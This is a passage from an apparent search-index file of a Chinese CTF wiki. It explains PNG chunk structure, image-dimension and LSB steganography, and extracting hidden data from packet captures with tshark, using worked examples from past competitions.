\u6570\u636e\u6d41\u4e2d\u53ea\u80fd\u6709\u4e00\u4e2a\u6587\u4ef6\u5934\u6570\u636e\u5757 \u5176\u4e2d\u6211\u4eec\u5173\u6ce8\u7684\u662f\u524d8\u5b57\u8282\u7684\u5185\u5bb9 \u57df\u7684\u540d\u79f0 \u5b57\u8282\u6570 \u8bf4\u660e Width 4 bytes \u56fe\u50cf\u5bbd\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d Height 4 bytes \u56fe\u50cf\u9ad8\u5ea6\uff0c\u4ee5\u50cf\u7d20\u4e3a\u5355\u4f4d \u6211\u4eec\u7ecf\u5e38\u4f1a\u53bb\u66f4\u6539\u4e00\u5f20\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u4f7f\u5f97\u4e00\u5f20\u56fe\u7247\u663e\u793a\u4e0d\u5b8c\u6574\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u4fe1\u606f\u7684\u76ee\u7684\u3002 \u8fd9\u91cc\u53ef\u4ee5\u53d1\u73b0\u5728 Kali \u4e2d\u662f\u6253\u4e0d\u5f00\u8fd9\u5f20\u56fe\u7247\u7684\uff0c\u63d0\u793a IHDR CRC error \uff0c\u800c Windows 10 \u81ea\u5e26\u7684\u56fe\u7247\u67e5\u770b\u5668\u80fd\u591f\u6253\u5f00\uff0c\u5c31\u63d0\u9192\u4e86\u6211\u4eec IHDR \u5757\u88ab\u4eba\u4e3a\u7684\u7be1\u6539\u8fc7\u4e86\uff0c\u4ece\u800c\u5c1d\u8bd5\u4fee\u6539\u56fe\u7247\u7684\u9ad8\u5ea6\u6216\u8005\u5bbd\u5ea6\u53d1\u73b0\u9690\u85cf\u7684\u5b57\u7b26\u4e32\u3002","title":"IHDR"},{"location":"misc/picture/png/#_2","text":"","title":"\u4f8b\u9898"},{"location":"misc/picture/png/#wdctf-finals-2017","text":"\u89c2\u5bdf\u6587\u4ef6\u53ef\u4ee5\u53d1\u73b0,\u6587\u4ef6\u5934\u53ca\u5bbd\u5ea6\u5f02\u5e38 00000000 80 59 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 |.YNG........IHDR| 00000010 00 00 00 00 00 00 02 f8 08 06 00 00 00 93 2f 8a |............../.| 00000020 6b 00 00 00 04 67 41 4d 41 00 00 9c 40 20 0d e4 |k....gAMA...@ ..| 00000030 cb 00 00 00 20 63 48 52 4d 00 00 87 0f 00 00 8c |.... cHRM.......| 00000040 0f 00 00 fd 52 00 00 81 40 00 00 7d 79 00 00 e9 |....R...@..}y...| ... \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6587\u4ef6\u5bbd\u5ea6\u4e0d\u80fd\u4efb\u610f\u4fee\u6539\uff0c\u9700\u8981\u6839\u636e IHDR \u5757\u7684 CRC \u503c\u7206\u7834\u5f97\u5230\u5bbd\u5ea6,\u5426\u5219\u56fe\u7247\u663e\u793a\u9519\u8bef\u4e0d\u80fd\u5f97\u5230 flag\u3002 import os import binascii import struct misc = open ( \"misc4.png\" , \"rb\" ) . read () for i in range ( 1024 ): data = misc [ 12 : 16 ] + struct . pack ( '>i' , i ) + misc [ 20 : 29 ] crc32 = binascii . crc32 ( data ) & 0xffffffff if crc32 == 0x932f8a6b : print i \u5f97\u5230\u5bbd\u5ea6\u503c\u4e3a 709 \u540e\uff0c\u6062\u590d\u56fe\u7247\u5f97\u5230 flag\u3002","title":"WDCTF-finals-2017"},{"location":"misc/picture/png/#plte","text":"\u8c03\u8272\u677f\u6570\u636e\u5757 PLTE\uff08palette chunk\uff09\uff1a\u5b83\u5305\u542b\u6709\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\uff08indexed-color image\uff09\u76f8\u5173\u7684\u5f69\u8272\u53d8\u6362\u6570\u636e\uff0c\u5b83\u4ec5\u4e0e\u7d22\u5f15\u5f69\u8272\u56fe\u50cf\u6709\u5173\uff0c\u800c\u4e14\u8981\u653e\u5728\u56fe\u50cf\u6570\u636e\u5757\uff08image data chunk\uff09\u4e4b\u524d\u3002\u771f\u5f69\u8272\u7684 PNG \u6570\u636e\u6d41\u4e5f\u53ef\u4ee5\u6709\u8c03\u8272\u677f\u6570\u636e\u5757\uff0c\u76ee\u7684\u662f\u4fbf\u4e8e\u975e\u771f\u5f69\u8272\u663e\u793a\u7a0b\u5e8f\u7528\u5b83\u6765\u91cf\u5316\u56fe\u50cf\u6570\u636e\uff0c\u4ece\u800c\u663e\u793a\u8be5\u56fe\u50cf\u3002","title":"PLTE"},{"location":"misc/picture/png/#idat","text":"\u56fe\u50cf\u6570\u636e\u5757 IDAT\uff08image data chunk\uff09\uff1a\u5b83\u5b58\u50a8\u5b9e\u9645\u7684\u6570\u636e\uff0c\u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757\u3002 \u50a8\u5b58\u56fe\u50cf\u50cf\u6570\u6570\u636e \u5728\u6570\u636e\u6d41\u4e2d\u53ef\u5305\u542b\u591a\u4e2a\u8fde\u7eed\u987a\u5e8f\u7684\u56fe\u50cf\u6570\u636e\u5757 \u91c7\u7528 LZ77 \u7b97\u6cd5\u7684\u6d3e\u751f\u7b97\u6cd5\u8fdb\u884c\u538b\u7f29 \u53ef\u4ee5\u7528 zlib \u89e3\u538b\u7f29 \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cIDAT \u5757\u53ea\u6709\u5f53\u4e0a\u4e00\u4e2a\u5757\u5145\u6ee1\u65f6\uff0c\u624d\u4f1a\u7ee7\u7eed\u4e00\u4e2a\u65b0\u7684\u5757\u3002 \u7528 pngcheck \u53bb\u67e5\u770b\u6b64 PNG \u6587\u4ef6 \u03bb . \\p ngcheck.exe -v sctf.png File: sctf.png ( 1421461 bytes ) chunk IHDR at offset 0x0000c, length 13 1000 x 562 image, 32 -bit RGB+alpha, non-interlaced chunk sRGB at offset 0x00025, length 1 rendering intent = perceptual chunk gAMA at offset 0x00032, length 4 : 0 .45455 chunk pHYs at offset 0x00042, length 9 : 3780x3780 pixels/meter ( 96 dpi ) chunk IDAT at offset 0x00057, length 65445 zlib: deflated, 32K window, fast compression chunk IDAT at offset 0x10008, length 65524 ... chunk IDAT at offset 0x150008, length 45027 chunk IDAT at offset 0x15aff7, length 138 chunk IEND at offset 0x15b08d, length 0 No errors detected in sctf.png ( 28 chunks, 36 .8% compression ) . \u53ef\u4ee5\u770b\u5230\uff0c\u6b63\u5e38\u7684\u5757\u7684 length \u662f\u5728 65524 \u7684\u65f6\u5019\u5c31\u6ee1\u4e86\uff0c\u800c\u5012\u6570\u7b2c\u4e8c\u4e2a IDAT \u5757\u957f\u5ea6\u662f 45027\uff0c\u6700\u540e\u4e00\u4e2a\u957f\u5ea6\u662f 138\uff0c\u5f88\u660e\u663e\u6700\u540e\u4e00\u4e2a IDAT \u5757\u662f\u6709\u95ee\u9898\u7684\uff0c\u56e0\u4e3a\u4ed6\u672c\u6765\u5e94\u8be5\u5e76\u5165\u5230\u5012\u6570\u7b2c\u4e8c\u4e2a\u672a\u6ee1\u7684\u5757\u91cc. \u5229\u7528 python zlib \u89e3\u538b\u591a\u4f59 IDAT \u5757\u7684\u5185\u5bb9\uff0c\u6b64\u65f6\u6ce8\u610f\u5254\u9664 \u957f\u5ea6\u3001\u6570\u636e\u5757\u7c7b\u578b\u53ca\u672b\u5c3e\u7684CRC\u6821\u9a8c\u503c \u3002 import zlib import binascii IDAT = \"789...667\" . decode ( 'hex' ) result = binascii . hexlify ( zlib . decompress ( IDAT )) print result","title":"IDAT"},{"location":"misc/picture/png/#iend","text":"\u56fe\u50cf\u7ed3\u675f\u6570\u636e IEND\uff08image trailer chunk\uff09\uff1a\u5b83\u7528\u6765\u6807\u8bb0 PNG \u6587\u4ef6\u6216\u8005\u6570\u636e\u6d41\u5df2\u7ecf\u7ed3\u675f\uff0c\u5e76\u4e14\u5fc5\u987b\u8981\u653e\u5728\u6587\u4ef6\u7684\u5c3e\u90e8\u3002 00 00 00 00 49 45 4E 44 AE 42 60 82 IEND \u6570\u636e\u5757\u7684\u957f\u5ea6\u603b\u662f 00 00 00 00 \uff0c\u6570\u636e\u6807\u8bc6\u603b\u662f IEND 49 45 4E 44 \uff0c\u56e0\u6b64\uff0cCRC \u7801\u4e5f\u603b\u662f AE 42 60 82 \u3002","title":"IEND"},{"location":"misc/picture/png/#_3","text":"\u80cc\u666f\u989c\u8272\u6570\u636e\u5757 bKGD\uff08background color\uff09 \u57fa\u8272\u548c\u767d\u8272\u5ea6\u6570\u636e\u5757 cHRM\uff08primary chromaticities and white point\uff09\uff0c\u6240\u8c13\u767d\u8272\u5ea6\u662f\u6307\u5f53 R\uff1dG\uff1dB\uff1d\u6700\u5927\u503c \u65f6\u5728\u663e\u793a\u5668\u4e0a\u4ea7\u751f\u7684\u767d\u8272\u5ea6 \u56fe\u50cf \u03b3 \u6570\u636e\u5757 gAMA\uff08image gamma\uff09 \u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757 hIST\uff08image histogram\uff09 \u7269\u7406\u50cf\u7d20\u5c3a\u5bf8\u6570\u636e\u5757 pHYs\uff08physical pixel dimensions\uff09 \u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757 sBIT\uff08significant bits\uff09 \u6587\u672c\u4fe1\u606f\u6570\u636e\u5757 tEXt\uff08textual data\uff09 \u56fe\u50cf\u6700\u540e\u4fee\u6539\u65f6\u95f4\u6570\u636e\u5757 tIME \uff08image last-modification time\uff09 \u56fe\u50cf\u900f\u660e\u6570\u636e\u5757 tRNS \uff08transparency\uff09 \u538b\u7f29\u6587\u672c\u6570\u636e\u5757 zTXt \uff08compressed textual data\uff09","title":"\u5176\u4f59\u8f85\u52a9\u6570\u636e\u5757"},{"location":"misc/picture/png/#lsb","text":"LSB \u5168\u79f0 Least Significant Bit\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\u3002PNG \u6587\u4ef6\u4e2d\u7684\u56fe\u50cf\u50cf\u6570\u4e00\u822c\u662f\u7531 RGB \u4e09\u539f\u8272\uff08\u7ea2\u7eff\u84dd\uff09\u7ec4\u6210\uff0c\u6bcf\u4e00\u79cd\u989c\u8272\u5360\u7528 8 \u4f4d\uff0c\u53d6\u503c\u8303\u56f4\u4e3a 0x00 \u81f3 0xFF \uff0c\u5373\u6709 256 \u79cd\u989c\u8272\uff0c\u4e00\u5171\u5305\u542b\u4e86 256 \u7684 3 \u6b21\u65b9\u7684\u989c\u8272\uff0c\u5373 16777216 \u79cd\u989c\u8272\u3002 \u800c\u4eba\u7c7b\u7684\u773c\u775b\u53ef\u4ee5\u533a\u5206\u7ea61000\u4e07\u79cd\u4e0d\u540c\u7684\u989c\u8272\uff0c\u610f\u5473\u7740\u4eba\u7c7b\u7684\u773c\u775b\u65e0\u6cd5\u533a\u5206\u4f59\u4e0b\u7684\u989c\u8272\u5927\u7ea6\u67096777216\u79cd\u3002 LSB \u9690\u5199\u5c31\u662f\u4fee\u6539 RGB \u989c\u8272\u5206\u91cf\u7684\u6700\u4f4e\u4e8c\u8fdb\u5236\u4f4d\uff08LSB\uff09\uff0c\u6bcf\u4e2a\u989c\u8272\u4f1a\u6709 8 bit\uff0cLSB \u9690\u5199\u5c31\u662f\u4fee\u6539\u4e86\u50cf\u6570\u4e2d\u7684\u6700\u4f4e\u7684 1 bit\uff0c\u800c\u4eba\u7c7b\u7684\u773c\u775b\u4e0d\u4f1a\u6ce8\u610f\u5230\u8fd9\u524d\u540e\u7684\u53d8\u5316\uff0c\u6bcf\u4e2a\u50cf\u7d20\u53ef\u4ee5\u643a\u5e26 3 \u6bd4\u7279\u7684\u4fe1\u606f\u3002 \u5982\u679c\u662f\u8981\u5bfb\u627e\u8fd9\u79cd LSB \u9690\u85cf\u75d5\u8ff9\u7684\u8bdd\uff0c\u6709\u4e00\u4e2a\u5de5\u5177 Stegsolve \u662f\u4e2a\u795e\u5668\uff0c\u53ef\u4ee5\u6765\u8f85\u52a9\u6211\u4eec\u8fdb\u884c\u5206\u6790\u3002 \u901a\u8fc7\u4e0b\u65b9\u7684\u6309\u94ae\u53ef\u4ee5\u89c2\u5bdf\u6bcf\u4e2a\u901a\u9053\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u67e5\u770b R \u901a\u9053\u7684\u6700\u4f4e\u4f4d\u7b2c 8 \u4f4d\u5e73\u9762\u7684\u4fe1\u606f\u3002 LSB \u7684\u4fe1\u606f\u501f\u52a9\u4e8e Stegsolve \u67e5\u770b\u5404\u4e2a\u901a\u9053\u65f6\u4e00\u5b9a\u8981\u7ec6\u5fc3\u6355\u6349\u5f02\u5e38\u70b9\uff0c\u6293\u4f4f LSB \u9690\u5199\u7684\u86db\u4e1d\u9a6c\u8ff9\u3002","title":"LSB"},{"location":"misc/picture/png/#_4","text":"HCTF - 2016 - Misc \u8fd9\u9898\u7684\u4fe1\u606f\u9690\u85cf\u5728 RGB \u4e09\u4e2a\u901a\u9053\u7684\u6700\u4f4e\u4f4d\u4e2d\uff0c\u501f\u52a9 Stegsolve-->Analyse-->Data Extract \u53ef\u4ee5\u6307\u5b9a\u901a\u9053\u8fdb\u884c\u63d0\u53d6\u3002 \u53ef\u4ee5\u53d1\u73b0 zip \u5934\uff0c\u7528 save bin \u4fdd\u5b58\u4e3a\u538b\u7f29\u5305\u540e\uff0c\u6253\u5f00\u8fd0\u884c\u5176\u4e2d\u7684 ELF \u6587\u4ef6\u5c31\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684 flag\u3002 \u66f4\u591a\u5173\u4e8e LSB \u7684\u7814\u7a76\u53ef\u4ee5\u770b \u8fd9\u91cc \u3002","title":"\u4f8b\u9898"},{"location":"misc/picture/png/#_5","text":"Stepic","title":"\u9690\u5199\u8f6f\u4ef6"},{"location":"misc/traffic/data/","text":"\u8fd9\u4e00\u5757\u662f\u6d41\u91cf\u5305\u4e2d\u53e6\u4e00\u4e2a\u91cd\u70b9,\u901a\u8fc7\u5bf9\u534f\u8bae\u5206\u6790,\u627e\u5230\u4e86\u9898\u76ee\u7684\u5173\u952e\u70b9,\u5982\u4f55\u63d0\u53d6\u6570\u636e\u6210\u4e86\u63a5\u4e0b\u6765\u7684\u5173\u952e\u95ee\u9898 wireshark \u00b6 wireshark\u81ea\u52a8\u5206\u6790 \u00b6 file -> export objects -> http \u624b\u52a8\u6570\u636e\u63d0\u53d6 \u00b6 file->export selected Packet Bytes tshark \u00b6 tshark\u4f5c\u4e3awireshark\u7684\u547d\u4ee4\u884c\u7248,\u9ad8\u6548\u5feb\u6377\u662f\u5b83\u7684\u4f18\u70b9,\u914d\u5408\u5176\u4f59\u547d\u4ee4\u884c\u5de5\u5177(awk,grep)\u7b49\u7075\u6d3b\u4f7f\u7528,\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d,\u63d0\u53d6\u6570\u636e\u4ece\u800c\u7701\u53bb\u4e86\u7e41\u6742\u7684\u811a\u672c\u7f16\u5199 \u518d\u770b Google CTF 2016 Forensic-200 \u8fd9\u4e00\u9898,\u53ef\u4ee5\u901a\u8fc7tshark\u8fc5\u901f\u5b8c\u6210\u89e3\u9898 what@kali:/tmp$ tshark -r capture.pcapng -T fields -e usb.capdata > data2.txt what@kali:/tmp$ # awk -F: 'function comp(v){if(v>127)v-=256;return v}{x+=comp(strtonum(\"0x\"$2));y+=comp(strtonum(\"0x\"$3))}$1==\"01\"{print x,y}' data.txt > data3.txt what@kali:/tmp$ gnuplot > plot \"data3.txt\" Step 1 \u9f20\u6807\u534f\u8bae\u4e2d\u6570\u636e\u63d0\u53d6 Step 2 \u901a\u8fc7awk\u8fdb\u884c\u4f4d\u7f6e\u5750\u6807\u8f6c\u6362 Step 3 \u5f62\u6210\u56fe\u5f62 \u5e38\u7528\u65b9\u6cd5 \u00b6 tshark -r **.pcap \u2013Y ** -T fields \u2013e ** | **** > data Usage: -Y <display filter> packet displaY filter in Wireshark display filter syntax -T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|? format of text output (def: text) -e <field> field to print if -Tfields selected (e.g. tcp.port, _ws.col.Info) \u901a\u8fc7 -Y \u8fc7\u6ee4\u5668(\u4e0ewireshark\u4e00\u81f4),\u7136\u540e\u7528 -T filds -e \u914d\u5408\u6307\u5b9a\u663e\u793a\u7684\u6570\u636e\u6bb5(\u6bd4\u5982usb.capdata) tips -e \u540e\u7684\u53c2\u6570\u4e0d\u786e\u5b9a\u53ef\u4ee5\u7531wireshark\u53f3\u51fb\u9700\u8981\u7684\u6570\u636e\u9009\u4e2d\u540e\u5f97\u5230 \u4f8b\u9898 google-ctf-2016 : a-cute-stegosaurus-100 \u8fd9\u9898\u7684\u6570\u636e\u9690\u85cf\u7684\u975e\u5e38\u5de7\u5999,\u800c\u4e14\u6709\u4e00\u5f20\u56fe\u7247\u6df7\u6dc6\u89c6\u542c,\u9700\u8981\u5bf9 tcp \u534f\u8bae\u975e\u5e38\u719f\u6089,\u6240\u4ee5\u5f53\u65f6\u505a\u51fa\u6765\u7684\u4eba\u5e76\u4e0d\u591a,\u5168\u7403\u53ea\u670926\u652f\u961f\u4f0d \u5728 tcp \u62a5\u6587\u6bb5\u4e2d\u67096Bit\u7684\u72b6\u6001\u63a7\u5236\u7801,\u5206\u522b\u5982\u4e0b URG\uff1a\u7d27\u6025\u6bd4\u7279\uff08urgent\uff09,\u5f53URG\uff1d1\u65f6\uff0c\u8868\u660e\u7d27\u6025\u6307\u9488\u5b57\u6bb5\u6709\u6548,\u4ee3\u8868\u8be5\u5c01\u5305\u4e3a\u7d27\u6025\u5c01\u5305\u3002\u5b83\u544a\u8bc9\u7cfb\u7edf\u6b64\u62a5\u6587\u6bb5\u4e2d\u6709\u7d27\u6025\u6570\u636e\uff0c\u5e94\u5c3d\u5feb\u4f20\u9001(\u76f8\u5f53\u4e8e\u9ad8\u4f18\u5148\u7ea7\u7684\u6570\u636e) ACK\uff1a\u786e\u8ba4\u6bd4\u7279\uff08Acknowledge\uff09\u3002\u53ea\u6709\u5f53ACK\uff1d1\u65f6\u786e\u8ba4\u53f7\u5b57\u6bb5\u624d\u6709\u6548,\u4ee3\u8868\u8fd9\u4e2a\u5c01\u5305\u4e3a\u786e\u8ba4\u5c01\u5305\u3002\u5f53ACK\uff1d0\u65f6\uff0c\u786e\u8ba4\u53f7\u65e0\u6548\u3002 PSH\uff1a\uff08Push function\uff09\u82e5\u4e3a1\u65f6\uff0c\u4ee3\u8868\u8981\u6c42\u5bf9\u65b9\u7acb\u5373\u4f20\u9001\u7f13\u51b2\u533a\u5185\u7684\u5176\u4ed6\u5bf9\u5e94\u5c01\u5305\uff0c\u800c\u65e0\u9700\u7b49\u7f13\u51b2\u6ee1\u4e86\u624d\u9001\u3002 RST\uff1a\u590d\u4f4d\u6bd4\u7279(Reset) ,\u5f53RST\uff1d1\u65f6\uff0c\u8868\u660eTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u4e25\u91cd\u5dee\u9519\uff08\u5982\u7531\u4e8e\u4e3b\u673a\u5d29\u6e83\u6216\u5176\u4ed6\u539f\u56e0\uff09\uff0c\u5fc5\u987b\u91ca\u653e\u8fde\u63a5\uff0c\u7136\u540e\u518d\u91cd\u65b0\u5efa\u7acb\u8fd0\u8f93\u8fde\u63a5\u3002 SYN\uff1a\u540c\u6b65\u6bd4\u7279(Synchronous)\uff0cSYN\u7f6e\u4e3a1\uff0c\u5c31\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u6216\u8fde\u63a5\u63a5\u53d7\u62a5\u6587,\u901a\u5e38\u5e26\u6709 SYN \u6807\u5fd7\u7684\u5c01\u5305\u8868\u793a\u300e\u4e3b\u52a8\u300f\u8981\u8fde\u63a5\u5230\u5bf9\u65b9\u7684\u610f\u601d\u3002\u3002 FIN\uff1a\u7ec8\u6b62\u6bd4\u7279(Final)\uff0c\u7528\u6765\u91ca\u653e\u4e00\u4e2a\u8fde\u63a5\u3002\u5f53FIN\uff1d1\u65f6\uff0c\u8868\u660e\u6b64\u62a5\u6587\u6bb5\u7684\u53d1\u9001\u7aef\u7684\u6570\u636e\u5df2\u53d1\u9001\u5b8c\u6bd5\uff0c\u5e76\u8981\u6c42\u91ca\u653e\u8fd0\u8f93\u8fde\u63a5\u3002 \u800c\u8fd9\u91cc\u7684 tcp.urg \u5374\u4e3a \u901a\u8fc7tshark\u63d0\u53d6 tcp.urg \u7136\u540e\u53bb\u96640\u7684\u5b57\u6bb5,\u6362\u884c\u7b26\u8f6c , \u76f4\u63a5\u8f6c\u6362\u6210python\u7684\u5217\u8868,\u8f6cascii\u5373\u53ef\u5f97\u5230flag \u26a1 root@kali: tshark -r Stego-200_urg.pcap -T fields -e tcp.urgent_pointer|egrep -vi \"^0$\"|tr '\\n' ',' Running as user \"root\" and group \"root\". This could be dangerous. 67,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125,# ... >>> print \"\".join([chr(x) for x in arr]) #python\u8f6c\u6362ascii CTF{And_You_Thought_It_Was_In_The_Picture} \u4f8b\u9898 stego-150_ears.xz Step 1 \u901a\u8fc7 file \u547d\u4ee4\u4e0d\u65ad\u89e3\u538b\u5f97\u5230pcap\u6587\u4ef6 \u279c Desktop file ears ears: XZ compressed data \u279c Desktop unxz < ears > file_1 \u279c Desktop file file_1 file_1: POSIX tar archive \u279c Desktop 7z x file_1 7 -Zip [ 64 ] 16 .02 : Copyright ( c ) 1999 -2016 Igor Pavlov : 2016 -05-21 p7zip Version 16 .02 ( locale = en_US.UTF-8,Utf16 = on,HugeFiles = on,64 bits,1 CPU Intel ( R ) Core ( TM ) i7-4710MQ CPU @ 2 .50GHz ( 306C3 ) ,ASM,AES-NI ) Scanning the drive for archives: 1 file, 4263936 bytes ( 4164 KiB ) Extracting archive: file_1 -- Path = file_1 Type = tar Physical Size = 4263936 Headers Size = 1536 Code Page = UTF-8 Everything is Ok Size: 4262272 Compressed: 4263936 Step 2 \u901a\u8fc7wireshark\u53d1\u73b0dns\u4e2d\u56de\u5e94\u540d\u5b57\u5b58\u5728\u5f02\u5e38\uff0c\u7ec4\u621016\u8fdb\u5236\u7684png\u6587\u4ef6 \u91c7\u7528tshark\u8fdb\u884c\u63d0\u53d6,\u63d0\u53d6dns\u4e2d\u7684\u6570\u636e,\u7b5b\u9009\u5177\u4f53\u62a5\u6587\u5f62\u5f0f \\w{4,}.asis.io tshark -r forensic_175_d78a42edc01c9104653776f16813d9e5 -T fields -e dns.qry.name -e dns.flags|grep 8180|awk '{if ($1~/\\w{4,}.asis.io/) print $1}'|awk -F '.' '{print $1}'|tr -d '\\n' > png Step 3 16\u8fdb\u5236\u8fd8\u539f\u56fe\u7247 xxd -p -r png flag Python Script \u00b6 TODO","title":"\u6570\u636e\u63d0\u53d6"},{"location":"misc/traffic/data/#wireshark","text":"","title":"wireshark"},{"location":"misc/traffic/data/#wireshark_1","text":"file -> export objects -> http","title":"wireshark\u81ea\u52a8\u5206\u6790"},{"location":"misc/traffic/data/#_1","text":"file->export selected Packet Bytes","title":"\u624b\u52a8\u6570\u636e\u63d0\u53d6"},{"location":"misc/traffic/data/#tshark","text":"tshark\u4f5c\u4e3awireshark\u7684\u547d\u4ee4\u884c\u7248,\u9ad8\u6548\u5feb\u6377\u662f\u5b83\u7684\u4f18\u70b9,\u914d\u5408\u5176\u4f59\u547d\u4ee4\u884c\u5de5\u5177(awk,grep)\u7b49\u7075\u6d3b\u4f7f\u7528,\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d,\u63d0\u53d6\u6570\u636e\u4ece\u800c\u7701\u53bb\u4e86\u7e41\u6742\u7684\u811a\u672c\u7f16\u5199 \u518d\u770b Google CTF 2016 Forensic-200 \u8fd9\u4e00\u9898,\u53ef\u4ee5\u901a\u8fc7tshark\u8fc5\u901f\u5b8c\u6210\u89e3\u9898 what@kali:/tmp$ tshark -r capture.pcapng -T fields -e usb.capdata > data2.txt what@kali:/tmp$ # awk -F: 'function comp(v){if(v>127)v-=256;return v}{x+=comp(strtonum(\"0x\"$2));y+=comp(strtonum(\"0x\"$3))}$1==\"01\"{print x,y}' data.txt > data3.txt what@kali:/tmp$ gnuplot > plot \"data3.txt\" Step 1 \u9f20\u6807\u534f\u8bae\u4e2d\u6570\u636e\u63d0\u53d6 Step 2 \u901a\u8fc7awk\u8fdb\u884c\u4f4d\u7f6e\u5750\u6807\u8f6c\u6362 Step 3 \u5f62\u6210\u56fe\u5f62","title":"tshark"},{"location":"misc/traffic/data/#_2","text":"tshark -r **.pcap \u2013Y ** -T fields \u2013e ** | **** > data Usage: -Y <display filter> packet displaY filter in Wireshark display filter syntax -T pdml|ps|psml|json|jsonraw|ek|tabs|text|fields|? format of text output (def: text) -e <field> field to print if -Tfields selected (e.g. tcp.port, _ws.col.Info) \u901a\u8fc7 -Y \u8fc7\u6ee4\u5668(\u4e0ewireshark\u4e00\u81f4),\u7136\u540e\u7528 -T filds -e \u914d\u5408\u6307\u5b9a\u663e\u793a\u7684\u6570\u636e\u6bb5(\u6bd4\u5982usb.capdata) tips -e \u540e\u7684\u53c2\u6570\u4e0d\u786e\u5b9a\u53ef\u4ee5\u7531wireshark\u53f3\u51fb\u9700\u8981\u7684\u6570\u636e\u9009\u4e2d\u540e\u5f97\u5230 \u4f8b\u9898 google-ctf-2016 : a-cute-stegosaurus-100 \u8fd9\u9898\u7684\u6570\u636e\u9690\u85cf\u7684\u975e\u5e38\u5de7\u5999,\u800c\u4e14\u6709\u4e00\u5f20\u56fe\u7247\u6df7\u6dc6\u89c6\u542c,\u9700\u8981\u5bf9 tcp \u534f\u8bae\u975e\u5e38\u719f\u6089,\u6240\u4ee5\u5f53\u65f6\u505a\u51fa\u6765\u7684\u4eba\u5e76\u4e0d\u591a,\u5168\u7403\u53ea\u670926\u652f\u961f\u4f0d \u5728 tcp \u62a5\u6587\u6bb5\u4e2d\u67096Bit\u7684\u72b6\u6001\u63a7\u5236\u7801,\u5206\u522b\u5982\u4e0b URG\uff1a\u7d27\u6025\u6bd4\u7279\uff08urgent\uff09,\u5f53URG\uff1d1\u65f6\uff0c\u8868\u660e\u7d27\u6025\u6307\u9488\u5b57\u6bb5\u6709\u6548,\u4ee3\u8868\u8be5\u5c01\u5305\u4e3a\u7d27\u6025\u5c01\u5305\u3002\u5b83\u544a\u8bc9\u7cfb\u7edf\u6b64\u62a5\u6587\u6bb5\u4e2d\u6709\u7d27\u6025\u6570\u636e\uff0c\u5e94\u5c3d\u5feb\u4f20\u9001(\u76f8\u5f53\u4e8e\u9ad8\u4f18\u5148\u7ea7\u7684\u6570\u636e) ACK\uff1a\u786e\u8ba4\u6bd4\u7279\uff08Acknowledge\uff09\u3002\u53ea\u6709\u5f53ACK\uff1d1\u65f6\u786e\u8ba4\u53f7\u5b57\u6bb5\u624d\u6709\u6548,\u4ee3\u8868\u8fd9\u4e2a\u5c01\u5305\u4e3a\u786e\u8ba4\u5c01\u5305\u3002\u5f53ACK\uff1d0\u65f6\uff0c\u786e\u8ba4\u53f7\u65e0\u6548\u3002 PSH\uff1a\uff08Push function\uff09\u82e5\u4e3a1\u65f6\uff0c\u4ee3\u8868\u8981\u6c42\u5bf9\u65b9\u7acb\u5373\u4f20\u9001\u7f13\u51b2\u533a\u5185\u7684\u5176\u4ed6\u5bf9\u5e94\u5c01\u5305\uff0c\u800c\u65e0\u9700\u7b49\u7f13\u51b2\u6ee1\u4e86\u624d\u9001\u3002 RST\uff1a\u590d\u4f4d\u6bd4\u7279(Reset) ,\u5f53RST\uff1d1\u65f6\uff0c\u8868\u660eTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u4e25\u91cd\u5dee\u9519\uff08\u5982\u7531\u4e8e\u4e3b\u673a\u5d29\u6e83\u6216\u5176\u4ed6\u539f\u56e0\uff09\uff0c\u5fc5\u987b\u91ca\u653e\u8fde\u63a5\uff0c\u7136\u540e\u518d\u91cd\u65b0\u5efa\u7acb\u8fd0\u8f93\u8fde\u63a5\u3002 SYN\uff1a\u540c\u6b65\u6bd4\u7279(Synchronous)\uff0cSYN\u7f6e\u4e3a1\uff0c\u5c31\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u6216\u8fde\u63a5\u63a5\u53d7\u62a5\u6587,\u901a\u5e38\u5e26\u6709 SYN \u6807\u5fd7\u7684\u5c01\u5305\u8868\u793a\u300e\u4e3b\u52a8\u300f\u8981\u8fde\u63a5\u5230\u5bf9\u65b9\u7684\u610f\u601d\u3002\u3002 FIN\uff1a\u7ec8\u6b62\u6bd4\u7279(Final)\uff0c\u7528\u6765\u91ca\u653e\u4e00\u4e2a\u8fde\u63a5\u3002\u5f53FIN\uff1d1\u65f6\uff0c\u8868\u660e\u6b64\u62a5\u6587\u6bb5\u7684\u53d1\u9001\u7aef\u7684\u6570\u636e\u5df2\u53d1\u9001\u5b8c\u6bd5\uff0c\u5e76\u8981\u6c42\u91ca\u653e\u8fd0\u8f93\u8fde\u63a5\u3002 \u800c\u8fd9\u91cc\u7684 tcp.urg \u5374\u4e3a \u901a\u8fc7tshark\u63d0\u53d6 tcp.urg \u7136\u540e\u53bb\u96640\u7684\u5b57\u6bb5,\u6362\u884c\u7b26\u8f6c , \u76f4\u63a5\u8f6c\u6362\u6210python\u7684\u5217\u8868,\u8f6cascii\u5373\u53ef\u5f97\u5230flag \u26a1 root@kali: tshark -r Stego-200_urg.pcap -T fields -e 